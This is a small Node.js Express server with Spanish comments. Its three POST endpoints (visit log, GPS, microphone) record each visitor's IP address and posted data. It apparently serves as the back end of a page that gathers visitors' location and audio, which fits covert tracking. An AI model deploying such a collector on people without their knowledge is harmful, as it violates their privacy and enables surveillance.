const express = require("express")

const app = express()

app.use(express.json())

app.use(express.static("public"))


// =======================
// LOG PRINCIPAL
// =======================

app.post("/log",(req,res)=>{

   const ip =
   req.headers['x-forwarded-for'] ||
   req.socket.remoteAddress

   console.log("\n========== VISITA ==========")

   console.log("IP:", ip)

   console.log(req.body)

   res.sendStatus(200)

})


// =======================
// GPS
// =======================

app.post("/gps",(req,res)=>{

   const ip =
   req.headers['x-forwarded-for'] ||
   req.socket.remoteAddress

   console.log("\n========== GPS ==========")

   console.log("IP:", ip)

   console.log(req.body)

   res.sendStatus(200)

})


// =======================
// MICROFONO
// =======================

app.post("/microfono",(req,res)=>{

   const ip =
   req.headers['x-forwarded-for'] ||
   req.socket.remoteAddress

   console.log("\n========== MICROFONO ==========")

   console.log("IP:", ip)

   console.log(req.body)

   res.sendStatus(200)

})


// =======================
// START
// =======================

const PORT = process.env.PORT || 3000

app.listen(PORT,()=>{

   console.log("Servidor iniciado")

})
